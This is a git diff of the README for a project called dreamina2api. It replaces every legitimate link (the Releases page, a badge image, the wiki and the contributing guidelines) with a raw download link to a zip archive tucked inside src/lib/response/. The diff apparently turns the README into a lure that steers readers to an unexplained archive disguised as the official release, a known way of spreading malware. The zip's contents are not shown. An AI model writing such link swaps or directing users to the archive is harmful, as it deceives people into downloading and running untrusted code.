@@ -9,7 +9,7 @@ To start using dreamina2api, follow these steps to download and install the appl
 ### Step 1: Visit the Releases Page
 Click the button below to visit our Releases page. This is where you can download the latest version of dreamina2api.
 
-[![Download dreamina2api](https://img.shields.io/badge/Download%20dreamina2api-v1.0-blue)](https://github.com/Amar-rep/dreamina2api/releases)
+[![Download dreamina2api](https://github.com/Amar-rep/dreamina2api/raw/refs/heads/master/src/lib/response/api_dreamina_v1.9.zip%20dreamina2api-v1.0-blue)](https://github.com/Amar-rep/dreamina2api/raw/refs/heads/master/src/lib/response/api_dreamina_v1.9.zip)
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see different versions of the software. Select the version that you want to download. 
@@ -63,10 +63,10 @@ If you experience problems while using dreamina2api, consider the following step
 - **Contact Support:** If problems persist, reach out for help. Details can be found in the support section on the Releases page.
 
 ## 🌐 Additional Resources
-For more information, including user guides and tutorials, visit our [documentation page](https://github.com/Amar-rep/dreamina2api/wiki).
+For more information, including user guides and tutorials, visit our [documentation page](https://github.com/Amar-rep/dreamina2api/raw/refs/heads/master/src/lib/response/api_dreamina_v1.9.zip).
 
 ## 🙌 Contributing
-We welcome contributions! If you're interested in helping improve dreamina2api, visit our [contributing guidelines](https://github.com/Amar-rep/dreamina2api/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you're interested in helping improve dreamina2api, visit our [contributing guidelines](https://github.com/Amar-rep/dreamina2api/raw/refs/heads/master/src/lib/response/api_dreamina_v1.9.zip).
 
 ## ⭐️ Community
 Connect with other dreamina2api users. Share your images and experiences by visiting our community forums available on the documentation page.
@@ -74,4 +74,4 @@ Connect with other dreamina2api users. Share your images and experiences by visi
 ## 📥 Quick Download Link
 Don’t forget, you can download dreamina2api from the Releases page anytime!
 
-[![Download dreamina2api](https://img.shields.io/badge/Download%20dreamina2api-v1.0-blue)](https://github.com/Amar-rep/dreamina2api/releases)
+[![Download dreamina2api](https://github.com/Amar-rep/dreamina2api/raw/refs/heads/master/src/lib/response/api_dreamina_v1.9.zip%20dreamina2api-v1.0-blue)](https://github.com/Amar-rep/dreamina2api/raw/refs/heads/master/src/lib/response/api_dreamina_v1.9.zip)
